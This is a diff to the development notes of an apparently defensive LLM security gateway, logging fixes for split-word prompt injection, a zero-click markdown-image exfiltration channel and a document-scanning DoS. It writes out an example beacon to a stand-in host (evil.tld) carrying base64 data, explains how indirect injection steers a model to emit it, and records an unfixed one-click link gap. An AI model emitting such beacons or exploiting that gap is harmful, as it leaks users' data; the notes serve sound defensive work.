@@ -70,8 +70,18 @@
         R4b (f176fc76) scanner.py: _reassemble_split_words glues short-fragment runs + re-segments vs
           injection vocab → fixed G3 (2 chunk-split/spaced injection). Vocab-curated → zero FP.
       REMAINING R4 hardening (NOT yet encoded as findings; lower priority than R5/R6 completion gates):
-        G6 multi-turn session state (scanner.py), G10 semantic-redact typed-placeholder,
-        G13 output markdown/link+tool-arg exfil (output_guard.py).
+        G6 multi-turn session state (scanner.py), G10 semantic-redact typed-placeholder.
+      G13 DONE 2026-07-02: output-side data-exfiltration channel (zero-click markdown-image / link /
+        bare-URL beacon). A model steered by indirect injection emits ![x](https://evil.tld/log?d=<b64>)
+        -> client auto-fetches the image on render -> zero-click exfil, even for NON-PII payloads (the
+        PII/secret detectors never fire). Reproduced: base64 arbitrary-data image beacon egressed
+        unmodified (allow). Fixed in output_guard.py: _check_exfil_channel + neutralize_exfil_channels
+        (image->plain link so no auto-render, payload->[exfil-redacted]); runs BEFORE core redaction so a
+        beacon can't ride out beside a PII redact. Images trip on encoded-text-blob OR embedded PII/secret;
+        links/bare trip only on concrete sensitive payload. HMAC/sha/cachebust don't FP; JWT-in-URL defangs.
+        10 golden cases frozen. Full gateway 1050 passed; golden 46 passed/7 skipped 3x.
+        Residual (documented, out of scope to avoid FP): one-click LINK carrying a NON-PII encoded blob is
+        not defanged (requires user click; encoded-blob-alone on links would FP on presigned/tracking URLs).
       G12 DONE 2026-07-02: context_guard ReDoS/DoS cap. _scan_single_document_sync ran the full
         injection/hidden/toxicity catalogue + PII/secret detectors over the ENTIRE doc text (M-19
         forbids pre-decision slicing) with NO budget -> cost linear+unbounded in attacker doc length;
